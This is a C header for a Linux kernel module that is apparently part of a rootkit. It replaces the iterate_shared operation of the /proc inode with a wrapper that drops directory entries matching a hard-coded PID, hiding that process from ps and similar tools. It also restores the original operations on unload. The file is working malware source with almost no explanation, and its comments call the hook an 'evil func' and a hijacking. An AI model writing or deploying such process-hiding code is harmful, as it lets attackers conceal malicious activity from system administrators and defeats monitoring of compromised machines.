#ifndef _PROC_H_
#define _PROC_H
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#define proc_pid_to_hide "8353"
static struct file_operations *backup_fops;
static struct file_operations proc_fops;
static struct inode *proc_inode;
static char *proc_to_hide = proc_pid_to_hide;
static struct dir_context *backup_ctx;
static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned intd_type)
{
    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
    {
        printk(KERN_ALERT "found proc");
        return -2;
    }
    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, intd_type);
}
int (* backup_iterate_shared) (struct file*, struct dir_context *);
struct dir_context rk_ctx = {
    .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_fops->iterate_shared(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;
    return result;
}
static int process_hide(void)
{
    struct path p;
    printk(KERN_ALERT "rk: LKM loaded!");
    kern_path("/proc", 0, &p);
    //get the inode
    proc_inode = p.dentry->d_inode;
    //get a copy of fop from inode
    proc_fops = *proc_inode->i_fop;
    //backup the fop
    backup_fops = proc_inode->i_fop;
    //modify the copy with out evil func (the hyjcking)
    proc_fops.iterate_shared = rk_iterate_shared;
    //overwrite the proc entry's fops
    proc_inode->i_fop = &proc_fops;
    return 1;

}
static void process_unhide(void)
{
    struct path p;
    if (kern_path("/proc", 0,&p))
        return;
    //get inode and restore fop
    proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_fops;
    printk(KERN_ALERT "rk: LKM unloaded!");
    

}

#endif 
